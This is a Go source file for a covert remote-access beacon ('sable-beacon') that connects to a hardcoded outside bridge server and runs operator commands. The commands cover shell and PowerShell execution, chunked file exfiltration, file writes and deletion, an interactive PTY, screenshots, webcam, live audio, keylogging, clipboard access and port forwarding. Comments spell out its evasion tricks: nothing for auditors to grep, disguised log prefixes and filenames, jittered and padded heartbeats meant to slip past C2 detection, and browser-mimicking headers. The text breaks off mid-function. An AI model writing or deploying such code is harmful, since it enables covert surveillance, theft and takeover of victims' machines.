package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"sable-beacon/stealth"

	"github.com/gorilla/websocket"
)

// quiet is set when the beacon is respawned with -quiet, indicating it was
// launched by a Run-key / autostart entry and is already the detached child.
var quiet bool

var (
	bridgeURL   string
	sablePort   int
	persistDir  string
	localPort   int
	targetID    string
	client      = &http.Client{Timeout: 35 * time.Second}
	ptySessions sync.Map // sessionID -> *PTYSession
	llmChats    sync.Map // chat_id -> last used time

	// Persistent WebSocket state
	wsConn *websocket.Conn
	wsMu   sync.Mutex
	wsDone chan struct{}

	// logPrefix replaces "[beacon]" / "[ws]" in all log output
	logPrefix = "[pow-solver]"
)

func main() {
	// No flags. No args. Nothing an auditor can grep for.
	// All config is either hardcoded here or decrypted from stealth constants.
	// Hardcoded prod endpoint. No env override — a stale SABLE_BRIDGE_URL
	// in the parent environment (dev shells, systemd, CI) must never be
	// able to redirect the beacon to a local address.
	bridgeURL = "https://sable-bridge.onrender.com"
	sablePort = 8765
	localPort = 18923
	persistDir = "system"

	targetID = loadOrCreateID()
	hostname, _ := os.Hostname()

	debugLog.Printf("%s started id=%s host=%s", logPrefix, targetID, hostname)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go startLocalServer()
	go heartbeatLoop(ctx, hostname)

	wsDone = make(chan struct{})
	go wsLoop(ctx)

	<-ctx.Done()
	closeAllTunnels()
}

func loadOrCreateID() string {
	os.MkdirAll(persistDir, 0o700)
	// Use ambiguous filename inside the shared system/ folder.
	// ".sync_state" looks like generic app state, not a beacon ID.
	idPath := filepath.Join(persistDir, "7a2b3c4d-le64.cache-4")
	data, err := os.ReadFile(idPath)
	if err == nil && len(bytes.TrimSpace(data)) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate OS-native looking ID instead of sable-<hash>-<timestamp>
	id := stealth.GenerateID(mustHostname())
	os.WriteFile(idPath, []byte(id), 0o600)
	return id
}

func mustHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

// ── Heartbeat (30s idle, enriched with telemetry) ────────────

func heartbeatLoop(ctx context.Context, hostname string) {
	for {
		sendHeartbeatWS(hostname)
		pruneLLMChats()
		// Jittered interval: 15s-45s instead of fixed 30s
		interval := stealth.HeartbeatInterval()
		select {
		case <-ctx.Done():
			return
		case <-time.After(interval):
		}
	}
}

func pruneLLMChats() {
	cutoff := time.Now().Add(-2 * time.Hour).Unix()
	llmChats.Range(func(key, value any) bool {
		if ts, ok := value.(int64); ok && ts < cutoff {
			llmChats.Delete(key)
		}
		return true
	})
}

// ── Persistent WebSocket Connection ──────────────────────────

func wsLoop(ctx context.Context) {
	defer close(wsDone)
	attempt := 0
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		connected := connectAndListen(ctx)
		if connected {
			attempt = 0 // reset on successful connection
		} else {
			attempt++
		}
		// Jittered exponential backoff instead of predictable doubling
		wait := stealth.ReconnectBackoff(attempt)
		select {
		case <-ctx.Done():
			return
		case <-time.After(wait):
		}
	}
}

func connectAndListen(ctx context.Context) bool {
	baseURL := bridgeURL

	// ── Protocol Masquerade: Pre-flight HTTP POST ────────────────
	// Before opening a WebSocket, send a normal-looking HTTP POST
	// that mimics a Sable chat API call. The bridge validates the
	// hidden auth token inside the JSON body. Only then does it
	// allow the subsequent WS upgrade.
	// To network observers: just a browser making an API request.
	if !sendPreflightGET(ctx, baseURL) {
		debugLog.Printf("%s preflight failed", logPrefix)
		return false
	}

	wsURL := baseURL
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + strings.TrimPrefix(wsURL, "http://")
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + strings.TrimPrefix(wsURL, "https://")
	}
	// Use encrypted WS path from stealth constants
	wsPath := "/ws/fc-sync/"
	wsURL = strings.TrimRight(wsURL, "/") + wsPath + targetID

	debugLog.Printf("%s connecting", logPrefix)

	dialer := newStealthDialer(15 * time.Second)
	// The bridge rejects WS upgrades with 403 when Origin is absent/mismatched.
	// Send the same browser-ish headers as the preflight so the upgrade looks
	// like a real Sable web client, not a bare WS client.
	wsHeaders := http.Header{}
	wsHeaders.Set("Origin", baseURL)
	wsHeaders.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
	wsHeaders.Set("Accept-Language", "en-US,en;q=0.9")
	wsHeaders.Set("Cache-Control", "no-cache")
	wsHeaders.Set("Pragma", "no-cache")

	conn, resp, err := dialer.DialContext(ctx, wsURL, wsHeaders)
	if err != nil {
		// gorilla hides the HTTP status behind the generic "bad handshake" error.
		// Surface the real response so we can tell 401/403/404/503/101 apart.
		if resp != nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
			resp.Body.Close()
			debugLog.Printf("%s dial error: %v (status=%d body=%q)", logPrefix, err, resp.StatusCode, string(body))
		} else {
			debugLog.Printf(`%s dial error: %v (no HTTP response �k"�3� TLS or TCP layer)`, logPrefix, err)
		}
		return false
	}

	wsMu.Lock()
	wsConn = conn
	wsMu.Unlock()

	defer func() {
		wsMu.Lock()
		wsConn = nil
		wsMu.Unlock()
		conn.Close()
		debugLog.Printf("%s disconnected", logPrefix)
	}()

	debugLog.Printf("%s connected", logPrefix)

	// Enable ping/pong keepalive to prevent proxy/load balancer idle kills
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// Send pings every 25s to keep the connection alive through proxies
	pingDone := make(chan struct{})
	go func() {
		defer close(pingDone)
		ticker := time.NewTicker(25 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				wsMu.Lock()
				if wsConn == nil {
					wsMu.Unlock()
					return
				}
				err := wsConn.WriteControl(websocket.PingMessage, nil, time.Now().Add(5*time.Second))
				wsMu.Unlock()
				if err != nil {
					return
				}
			}
		}
	}()

	for {
		select {
		case <-ctx.Done():
			return true
		default:
		}

		_, raw, err := conn.ReadMessage()
		if err != nil {
			if !websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
				debugLog.Printf("%s read error: %v", logPrefix, err)
			}
			return true
		}

		// Reset read deadline on any message (not just pong)
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		var rawMsg map[string]json.RawMessage
		if err := json.Unmarshal(raw, &rawMsg); err != nil {
			continue
		}
		kType := "type"
		var msgType string
		if v, ok := rawMsg[kType]; ok {
			json.Unmarshal(v, &msgType)
		}
		msgData := rawMsg["data"]

		switch stealth.ModeHash(msgType) {
		case stealth.ModeHash("command"):
			if cmd, err := unmarshalCommand(msgData); err == nil {
				go executeAndReportWS(ctx, cmd)
			}
		case stealth.ModeHash("pty_input"):
			handlePTYInput(msgData)
		case stealth.ModeHash("pty_resize"):
			handlePTYResize(msgData)
		}
	}
}

// testHookSend, when non-nil, receives every wsSend payload instead of
// (in addition to) the real WebSocket write. Used by unit tests to observe
// PTY output without a live connection. Always nil in production.
var testHookSend func(msgType string, data any)

func wsSend(msgType string, data any) {
	if testHookSend != nil {
		testHookSend(msgType, data)
	}
	payload, err := json.Marshal(map[string]any{
		"type": msgType,
		"data": data,
	})
	if err != nil {
		return
	}

	wsMu.Lock()
	defer wsMu.Unlock()
	if wsConn == nil {
		return
	}
	if err := wsConn.WriteMessage(websocket.TextMessage, payload); err != nil {
		debugLog.Printf("[ws] send error: %v", err)
	}
}

// sendHeartbeatWS sends enriched heartbeat via persistent WS.
// Payload size is randomized on every call to defeat traffic analysis
// (Zeek/Suricata flag fixed-size periodic packets as C2 beacons).
func sendHeartbeatWS(hostname string) {
	payload := map[string]any{
		"target_id":   targetID,
		"hostname":   hostname,
		"platform":   runtime.GOOS + "/" + runtime.GOARCH,
		"engine_type": "sable",
	}

	telemetry := collectTelemetry()
	for k, v := range telemetry {
		payload[k] = v
	}

	paddingLen := stealth.RandInt(520) + 80
	payload["padding"] = stealth.RandomB64(paddingLen)

	wsSend("heartbeat", payload)
}

// ── Execute & Report (via WS, instant) ───────────────────────

func executeAndReportWS(ctx context.Context, cmd Command) {
	debugLog.Printf("[exec] cmd=%s mode=%s prompt_len=%d", cmd.ID, cmd.Mode, len(cmd.Prompt))
	result := executeCommand(ctx, cmd)

	kMode := "mode"
	if result == nil {
		result = map[string]any{}
	}
	if _, hasMode := result[kMode]; !hasMode {
		result[kMode] = cmd.Mode
	}

	wsSend("result", map[string]any{
		"command_id": cmd.ID,
		"target_id":  targetID,
		"result":    result,
	})
}

// ── PTY Input/Resize handlers ────────────────────────────────

func handlePTYInput(data json.RawMessage) {
	var raw map[string]json.RawMessage
	if err := json.Unmarshal(data, &raw); err != nil {
		return
	}
	getStr := func(k string) string {
		var s string
		if v, ok := raw[k]; ok {
			json.Unmarshal(v, &s)
		}
		return s
	}
	getInt := func(k string) int {
		var i int
		if v, ok := raw[k]; ok {
			json.Unmarshal(v, &i)
		}
		return i
	}
	_ = getInt // unused here but keeps helper pattern consistent
	sid := getStr("session_id")
	d := getStr("data")
	if val, ok := ptySessions.Load(sid); ok {
		val.(*PTYSession).Write([]byte(d))
	}
}

func handlePTYResize(data json.RawMessage) {
	var raw map[string]json.RawMessage
	if err := json.Unmarshal(data, &raw); err != nil {
		return
	}
	getStr := func(k string) string {
		var s string
		if v, ok := raw[k]; ok {
			json.Unmarshal(v, &s)
		}
		return s
	}
	getInt := func(k string) int {
		var i int
		if v, ok := raw[k]; ok {
			json.Unmarshal(v, &i)
		}
		return i
	}
	sid := getStr("session_id")
	cols := getInt("cols")
	rows := getInt("rows")
	if val, ok := ptySessions.Load(sid); ok {
		val.(*PTYSession).Resize(cols, rows)
	}
}

// ── Command Types & Execution ────────────────────────────────

type Command struct {
	ID       string
	TargetID string
	Mode     string
	Prompt   string
}

func unmarshalCommand(data json.RawMessage) (Command, error) {
	var raw map[string]json.RawMessage
	if err := json.Unmarshal(data, &raw); err != nil {
		return Command{}, err
	}
	var c Command
	getStr := func(key string) string {
		if v, ok := raw[key]; ok {
			var s string
			if json.Unmarshal(v, &s) == nil {
				return s
			}
		}
		return ""
	}
	c.ID = getStr("id")
	c.TargetID = getStr("target_id")
	c.Mode = getStr("mode")
	c.Prompt = getStr("prompt")
	return c, nil
}

func (c *Command) parsedPayload() json.RawMessage {
	if c.Prompt == "" {
		return json.RawMessage("{}")
	}
	var obj map[string]any
	if err := json.Unmarshal([]byte(c.Prompt), &obj); err == nil {
		return json.RawMessage(c.Prompt)
	}
	switch stealth.ModeHash(c.Mode) {
	case stealth.ModeHash_SHELL, stealth.ModeHash_POWERSHELL:
		return json.RawMessage(fmt.Sprintf(`{"`+"cmd"+`":%s}`, jsonString(c.Prompt)))
	default:
		return json.RawMessage(fmt.Sprintf(`{"`+"prompt"+`":%s}`, jsonString(c.Prompt)))
	}
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func cutLine(buf *strings.Builder) (string, bool) {
	s := buf.String()
	idx := strings.IndexByte(s, '\n')
	if idx < 0 {
		return "", false
	}
	line := s[:idx]
	buf.Reset()
	buf.WriteString(s[idx+1:])
	return line, true
}

func executeCommand(ctx context.Context, cmd Command) map[string]any {
	payload := cmd.parsedPayload()
	// Hash-dispatch: cmd.Mode arrives as plaintext JSON from the bridge, but
	// the plaintext literal never lives in this binary. We hash the incoming
	// value and compare against pre-computed hashes (see ModeHash_* constants).
	switch stealth.ModeHash(cmd.Mode) {
	// Shell
	case stealth.ModeHash_SHELL:
		return execShell(payload)
	case stealth.ModeHash_POWERSHELL:
		if runtime.GOOS == "windows" {
			return execPowershell(payload)
		}
		return execShell(payload)

	// Filesystem
	case stealth.ModeHash_FSLIST:
		return execFSList(payload)
	case stealth.ModeHash_FSDOWNLOAD:
		return execFSDownload(payload)
	case stealth.ModeHash_FSWRITE:
		return execFSWrite(payload)
	case stealth.ModeHash_FSDELETE:
		return execFSDelete(payload)
	case stealth.ModeHash_FSMOVE:
		return execFSMove(payload)
	case stealth.ModeHash_FSMKDIR:
		return execFSMkdir(payload)
	case stealth.ModeHash_FSSEARCH:
		return execFSSearch(payload)

	// System
	case stealth.ModeHash_DIAGNOSTICS:
		return runDiagnostics()
	case stealth.ModeHash_TELEMETRY:
		return collectTelemetry()
	case stealth.ModeHash_PS:
		return map[string]any{"processes": execProcessList()}
	case stealth.ModeHash_KILL:
		return execKillProcess(parseMap(payload))
	case stealth.ModeHash_POWER:
		return execPower(payload)
	case stealth.ModeHash_SERVICE:
		return execService(payload)

	// Network
	case stealth.ModeHash_NETPORTS:
		return map[string]any{"ports": execNetPorts()}
	case stealth.ModeHash_NETINFO:
		return execNetInfo()

	// Media
	case stealth.ModeHash_SCREENSHOT:
		return execScreenshot()
	case stealth.ModeHash_WEBCAM:
		return execWebcam(payload)
	case stealth.ModeHash_WEBCAMLIST:
		return execWebcamList(payload)
	case stealth.ModeHash_WEBCAMSTREAM:
		return execWebcamStream(payload)
	case stealth.ModeHash_SCREENSTREAM:
		return execScreenStream(payload)
	case stealth.ModeHash_RECORD:
		return execRecord(payload)
	case stealth.ModeHash_KEYLOG:
		return execKeylog(payload)
	case stealth.ModeHash_LIVEAUDIO:
		return execAudioStream(payload)
	case stealth.ModeHash_CLIPBOARD:
		return execClipboard(parseMap(payload))
	case stealth.ModeHash_TTS:
		return execTTS(parseMap(payload))

	// LLM
	case stealth.ModeHash_LLM:
		return execLLM(payload)
	case stealth.ModeHash_LLMRESET:
		return execLLMReset(payload)

	// PTY
	case stealth.ModeHash_PTYCONNECT:
		return execPTYConnect(payload)
	case stealth.ModeHash_PTYDISCONNECT:
		return execPTYDisconnect(payload)

	// Port Forwarding (dedicated data WS, control plane untouched)
	case stealth.ModeHash_PORTFORWARD:
		return execPortForward(payload)
	case stealth.ModeHash_PORTCLOSE:
		return execPortClose(payload)

	default:
		return map[string]any{"error": fmt.Sprintf("unknown mode: %s", cmd.Mode)}
	}
}

func parseMap(raw json.RawMessage) map[string]any {
	var m map[string]any
	json.Unmarshal(raw, &m)
	if m == nil {
		return map[string]any{}
	}
	return m
}

func payloadStr(raw json.RawMessage, encKey []byte) string {
	var m map[string]json.RawMessage
	if json.Unmarshal(raw, &m) != nil {
		return ""
	}
	v, ok := m[stealth.D(encKey)]
	if !ok {
		return ""
	}
	var s string
	json.Unmarshal(v, &s)
	return s
}

func payloadInt(raw json.RawMessage, encKey []byte) int {
	var m map[string]json.RawMessage
	if json.Unmarshal(raw, &m) != nil {
		return 0
	}
	v, ok := m[stealth.D(encKey)]
	if !ok {
		return 0
	}
	var i int
	json.Unmarshal(v, &i)
	return i
}

func payloadBool(raw json.RawMessage, encKey []byte) bool {
	var m map[string]json.RawMessage
	if json.Unmarshal(raw, &m) != nil {
		return false
	}
	v, ok := m[stealth.D(encKey)]
	if !ok {
		return false
	}
	var b bool
	json.Unmarshal(v, &b)
	return b
}

// ── PowerShell Execution (Windows) ───────────────────────────

func execPowershell(payload json.RawMessage) map[string]any {
	pCmd := payloadStr(payload, stealth.EncKeyCmd)
	if pCmd == "" {
		return map[string]any{"error": "invalid command"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	kExit := "exit_code"
	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-Command", pCmd)
	output, err := cmd.CombinedOutput()

	result := map[string]any{
		kExit:                           0,
		"output": string(output),
		"mode":   "powershell",
	}
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			result[kExit] = exitErr.ExitCode()
		} else {
			result["error"] = err.Error()
		}
	}
	return result
}

// ── Shell Execution ──────────────────────────────────────────

func execShell(payload json.RawMessage) map[string]any {
	pCmd := payloadStr(payload, stealth.EncKeyCmd)
	if pCmd == "" {
		return map[string]any{"error": "invalid command"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/sh"
	}

	cmd := exec.CommandContext(ctx, shell, "-c", pCmd)
	output, err := cmd.CombinedOutput()

	result := map[string]any{
		"exit_code": 0,
		"output":   string(output),
		"mode":     "shell",
	}
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			result["exit_code"] = exitErr.ExitCode()
		} else {
			result["error"] = err.Error()
		}
	}
	return result
}

// ── Filesystem Helpers ───────────────────────────────────────

func expandPath(p string) string {
	if strings.HasPrefix(p, "~/") || p == "~" {
		home, err := os.UserHomeDir()
		if err == nil {
			return filepath.Join(home, strings.TrimPrefix(p, "~"))
		}
	}
	if !filepath.IsAbs(p) {
		abs, err := filepath.Abs(p)
		if err == nil {
			return abs
		}
	}
	return p
}

type fsEntry struct {
	Name        string `json:"name"`
	IsDir       bool   `json:"is_dir"`
	Size        int64  `json:"size"`
	Modified    string `json:"modified"`
	Permissions string `json:"permissions"`
}

func listDir(dir string) ([]fsEntry, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	var result []fsEntry
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		result = append(result, fsEntry{
			Name:        e.Name(),
			IsDir:       e.IsDir(),
			Size:        info.Size(),
			Modified:    info.ModTime().Format(time.RFC3339),
			Permissions: info.Mode().String(),
		})
	}
	return result, nil
}

func encodeBase64(data []byte) string {
	out := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
	base64.StdEncoding.Encode(out, data)
	return string(out)
}

// ── Filesystem Commands ──────────────────────────────────────

func execFSList(payload json.RawMessage) map[string]any {
	var p struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		p.Path = "."
	}

	expanded := expandPath(p.Path)
	entries, err := listDir(expanded)
	if err != nil {
		return map[string]any{"error": err.Error(), "path": expanded}
	}
	return map[string]any{
		"entries": entries,
		"path":    expanded,
		"count":   len(entries),
	}
}

const _fsChunkSize = 512 * 1024 // 512KB per chunk — fits comfortably in WS frames

// resolveTransferID honours a bridge-supplied transfer ID so the consumer can
// register its queue before streaming starts. Falls back to a locally generated
// ID for legacy bridges that don't send one.
func resolveTransferID(payload json.RawMessage) string {
	if id := payloadStr(payload, stealth.EncKeyTransferID); id != "" {
		return id
	}
	return fmt.Sprintf("dl_%d", time.Now().UnixNano())
}

func execFSDownload(payload json.RawMessage) map[string]any {
	var p struct {
		Path       string `json:"path"`
		TransferID string `json:"transfer_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		return map[string]any{"error": "missing path"}
	}

	expanded := expandPath(p.Path)
	info, err := os.Stat(expanded)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	// Directories: tar.gz into memory, then stream chunks
	if info.IsDir() {
		var buf bytes.Buffer
		if err := tarGzDir(expanded, &buf); err != nil {
			return map[string]any{"error": err.Error()}
		}
		filename := filepath.Base(expanded) + ".tar.gz"
		totalSize := buf.Len()
		// Echo the bridge's pre-allocated transfer_id (same as the file branch).
		// Generating our own id here orphans every chunk: the bridge keys the
		// consumer queue by the id it sent us, so a local id drops them all.
		transferID := resolveTransferID(payload)
		go streamChunks(transferID, filename, totalSize, bytes.NewReader(buf.Bytes()))
		return map[string]any{
			"transfer_id": transferID,
			"filename":   filename,
			"size":       totalSize,
			"chunked":    true,
		}
	}

	// Files: stream directly from disk in chunks
	f, err := os.Open(expanded)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	filename := filepath.Base(expanded)
	totalSize := int(info.Size())
	transferID := resolveTransferID(payload)

	// Stream chunks asynchronously via WS, return metadata immediately
	go func() {
		defer f.Close()
		streamChunks(transferID, filename, totalSize, f)
	}()

	return map[string]any{
		"transfer_id": transferID,
		"filename":   filename,
		"size":       totalSize,
		"chunked":    true,
	}
}

// streamChunks reads from r and sends base64-encoded chunks over WS.
// Each chunk is a separate "file_chunk" message so the bridge can relay
// them to the browser incrementally without buffering the whole file.
func streamChunks(transferID, filename string, totalSize int, r io.Reader) {
	buf := make([]byte, _fsChunkSize)
	seq := 0
	for {
		n, readErr := r.Read(buf)
		if n > 0 {
			chunk := base64.StdEncoding.EncodeToString(buf[:n])
			wsSend("file_chunk", map[string]any{
				"transfer_id": transferID,
				"filename":   filename,
				"size":       totalSize,
				"seq":        seq,
				"chunk":      chunk,
				"done":       false,
			})
			seq++
		}
		if readErr != nil {
			break
		}
	}
	// Send final marker
	wsSend("file_chunk", map[string]any{
		"transfer_id": transferID,
		"filename":   filename,
		"size":       totalSize,
		"seq":        seq,
		"chunk":      "",
		"done":       true,
	})
}

func execFSWrite(payload json.RawMessage) map[string]any {
	var p struct {
		Path    string `json:"path"`
		Content string `json:"content"` // base64 encoded
		Mode    uint32 `json:"mode"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		return map[string]any{"error": "missing path or content"}
	}

	expanded := expandPath(p.Path)

	// Ensure parent directory exists
	os.MkdirAll(filepath.Dir(expanded), 0o755)

	data, err := base64.StdEncoding.DecodeString(p.Content)
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("base64 decode: %v", err)}
	}

	perm := os.FileMode(0o644)
	if p.Mode != 0 {
		perm = os.FileMode(p.Mode)
	}

	if err := os.WriteFile(expanded, data, perm); err != nil {
		return map[string]any{"error": err.Error()}
	}

	return map[string]any{"status": "written", "path": expanded, "size": len(data)}
}

func execFSDelete(payload json.RawMessage) map[string]any {
	var p struct {
		Path      string `json:"path"`
		Recursive bool   `json:"recursive"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		return map[string]any{"error": "missing path"}
	}

	expanded := expandPath(p.Path)
	info, err := os.Stat(expanded)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	if info.IsDir() {
		if !p.Recursive {
			return map[string]any{"error": "directory requires recursive=true"}
		}
		if err := os.RemoveAll(expanded); err != nil {
			return map[string]any{"error": err.Error()}
		}
	} else {
		if err := os.Remove(expanded); err != nil {
			return map[string]any{"error": err.Error()}
		}
	}

	return map[string]any{"status": "deleted", "path": expanded}
}

func execFSMove(payload json.RawMessage) map[string]any {
	var p struct {
		Src  string `json:"src"`
		Dest string `json:"dest"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Src == "" || p.Dest == "" {
		return map[string]any{"error": "missing src or dest"}
	}

	srcPath := expandPath(p.Src)
	destPath := expandPath(p.Dest)

	if err := os.Rename(srcPath, destPath); err != nil {
		return map[string]any{"error": err.Error()}
	}

	return map[string]any{"status": "moved", "src": srcPath, "dest": destPath}
}

func execFSMkdir(payload json.RawMessage) map[string]any {
	var p struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		return map[string]any{"error": "missing path"}
	}

	expanded := expandPath(p.Path)
	if err := os.MkdirAll(expanded, 0o755); err != nil {
		return map[string]any{"error": err.Error()}
	}

	return map[string]any{"status": "created", "path": expanded}
}

func execFSSearch(payload json.RawMessage) map[string]any {
	var p struct {
		Path    string `json:"path"`
		Query   string `json:"query"`
		MaxHits int    `json:"max_hits"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Query == "" {
		return map[string]any{"error": "missing query"}
	}
	if p.MaxHits == 0 {
		p.MaxHits = 100
	}

	searchRoot := "."
	if p.Path != "" {
		searchRoot = expandPath(p.Path)
	}

	// Try ripgrep first, fall back to grep -r
	out, err := runCmd("rg", "--json", "--max-count", fmt.Sprintf("%d", p.MaxHits), p.Query, searchRoot)
	if err != nil {
		// Fallback to grep
		out, err = runCmd("grep", "-rn", "--max-count="+fmt.Sprintf("%d", p.MaxHits), p.Query, searchRoot)
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("search failed: %v", err), "results": []any{}}
		}
		return map[string]any{"results": parseGrepResults(out), "tool": "grep"}
	}

	return map[string]any{"raw": out, "tool": "ripgrep"}
}

func parseGrepResults(output string) []map[string]string {
	var results []map[string]string
	lines := strings.Split(strings.TrimSpace(output), `
`)
	for _, line := range lines {
		if line == "" {
			continue
		}
		// grep -rn format: file:line:content
		parts := strings.SplitN(line, ":", 3)
		if len(parts) >= 3 {
			results = append(results, map[string]string{
				"file": parts[0],
				"line": parts[1],
				"content": parts[2],
			})
		}
	}
	return results
}

// ── Power Controls ───────────────────────────────────────────

func execPower(payload json.RawMessage) map[string]any {
	var p struct {
		Action string `json:"action"` // reboot, shutdown, suspend, hibernate
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Action == "" {
		return map[string]any{"error": "missing action"}
	}

	var cmd *exec.Cmd
	switch p.Action {
	case "reboot":
		if runtime.GOOS == "windows" {
			cmd = exec.Command("shutdown", "/r", "/t", "0")
		} else {
			cmd = exec.Command("systemctl", "reboot")
		}
	case "shutdown":
		if runtime.GOOS == "windows" {
			cmd = exec.Command("shutdown", "/s", "/t", "0")
		} else {
			cmd = exec.Command("systemctl", "poweroff")
		}
	case "suspend":
		if runtime.GOOS == "windows" {
			return map[string]any{"error": "suspend not supported on windows"}
		}
		cmd = exec.Command("systemctl", "suspend")
	case "hibernate":
		if runtime.GOOS == "windows" {
			cmd = exec.Command("shutdown", "/h")
		} else {
			cmd = exec.Command("systemctl", "hibernate")
		}
	default:
		return map[string]any{"error": fmt.Sprintf("unknown power action: %s", p.Action)}
	}

	// Run in background so we can report before machine goes down
	go func() {
		time.Sleep(500 * time.Millisecond)
		cmd.Run()
	}()

	return map[string]any{"status": "executing", "action": p.Action}
}

// ── Service Manager ──────────────────────────────────────────

func execService(payload json.RawMessage) map[string]any {
	var p struct {
		Action string `json:"action"` // start, stop, restart, status, list
		Name   string `json:"name"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Action == "" {
		return map[string]any{"error": "missing action"}
	}

	if runtime.GOOS == "windows" {
		return execServiceWindows(p.Action, p.Name)
	}

	switch p.Action {
	case "list":
		// Fetch both system and user-level services (user services like Sable
		// live under the UID session and are invisible to plain systemctl)
		sysOut, sysErr := runCmd("systemctl", "list-units", "--type=service", "--no-pager", "--plain")
		usrOut, usrErr := runCmd("systemctl", "--user", "list-units", "--type=service", "--no-pager", "--plain")
		if sysErr != nil && usrErr != nil {
			return map[string]any{"error": sysErr.Error()}
		}
		combined := `=== SYSTEM SERVICES ===
` + sysOut
		if usrErr == nil && usrOut != "" {
			combined += `
=== USER SERVICES ===
` + usrOut
		}
		return map[string]any{"services": combined}
	case "start", "stop", "restart":
		if p.Name == "" {
			return map[string]any{"error": "missing service name"}
		}
		// Try user scope first (where Sable lives), fall back to system
		out, err := runCmd("systemctl", "--user", p.Action, p.Name)
		if err != nil {
			out, err = runCmd("systemctl", p.Action, p.Name)
			if err != nil {
				return map[string]any{"error": err.Error(), "output": out}
			}
		}
		return map[string]any{"status": "ok", "action": p.Action, "name": p.Name}
	case "status":
		if p.Name == "" {
			return map[string]any{"error": "missing service name"}
		}
		// Try user scope first, fall back to system
		out, _ := runCmd("systemctl", "--user", "status", p.Name, "--no-pager")
		if out == "" || strings.Contains(out, "not-found") {
			out, _ = runCmd("systemctl", "status", p.Name, "--no-pager")
		}
		return map[string]any{"output": out, "name": p.Name}
	default:
		return map[string]any{"error": fmt.Sprintf("unknown service action: %s", p.Action)}
	}
}

func execServiceWindows(action, name string) map[string]any {
	switch action {
	case "list":
		out, err := runCmd("sc", "query", "state=all")
		if err != nil {
			return map[string]any{"error": err.Error()}
		}
		return map[string]any{"services": out}
	case "start", "stop":
		out, err := runCmd("sc", action, name)
		if err != nil {
			return map[string]any{"error": err.Error(), "output": out}
		}
		return map[string]any{"status": "ok"}
	default:
		return map[string]any{"error": "unsupported service action on windows"}
	}
}

// ── Network Info ─────────────────────────────────────────────

func execNetInfo() map[string]any {
	if runtime.GOOS == "windows" {
		out, err := runCmd("ipconfig", "/all")
		if err != nil {
			return map[string]any{"error": err.Error()}
		}
		return map[string]any{"raw": out}
	}

	interfaces := []map[string]any{}

	// Use ip command
	out, err := runCmd("ip", "-j", "addr", "show")
	if err == nil {
		var parsed []map[string]any
		if json.Unmarshal([]byte(out), &parsed) == nil {
			return map[string]any{"interfaces": parsed}
		}
	}

	// Fallback to ifconfig
	out, err = runCmd("ifconfig")
	if err != nil {
		out, err = runCmd("ip", "addr", "show")
		if err != nil {
			return map[string]any{"error": "no network tool available"}
		}
	}

	return map[string]any{"raw": out, "interfaces": interfaces}
}

// ── LLM ──────────────────────────────────────────────────────

func execLLM(payload json.RawMessage) map[string]any {
	prompt := payloadStr(payload, stealth.EncKeyPrompt)
	if prompt == "" {
		return map[string]any{"error": "invalid command"}
	}

	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)
	chatID := payloadStr(payload, stealth.EncKeyChatID)

	if chatID == "" {
		newChat := map[string]any{"name": "sable"}
		body, _ := json.Marshal(newChat)
		resp, err := client.Post(localURL+"/api/chat/new", "application/json", bytes.NewReader(body))
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("create chat: %v", err)}
		}
		var cr map[string]json.RawMessage
		json.NewDecoder(resp.Body).Decode(&cr)
		resp.Body.Close()
		if rawID, ok := cr["id"]; ok {
			json.Unmarshal(rawID, &chatID)
		}
	}

	// Note: "role" and "content" are Sable API fields, not beacon protocol.
	// They must remain plaintext for the local Sable server to parse.
	msg := map[string]any{
		"chat_id":    chatID,
		"role": "user",
		"content": prompt,
	}
	body, _ := json.Marshal(msg)
	resp, err := client.Post(localURL+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("send prompt: %v", err)}
	}
	defer resp.Body.Close()

